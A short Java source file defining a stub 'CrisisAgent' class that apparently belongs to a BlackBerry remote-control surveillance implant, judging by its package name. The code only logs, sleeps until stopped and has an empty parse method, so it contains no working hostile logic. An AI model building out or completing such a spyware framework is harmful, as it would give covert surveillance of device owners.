package com.ht.rcs.blackberry.agent;

import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class CrisisAgent extends Agent {
    static Debug debug = new Debug("CrisisAgent", DebugLevel.VERBOSE);

    public CrisisAgent(int agentStatus) {
        super(Agent.AGENT_CRISIS, agentStatus, true);
    }

    protected CrisisAgent(int agentStatus, byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    public void agentRun() {
        debug.trace("run");
        this.sleepUntilStopped();

    }

    protected boolean parse(byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }

}
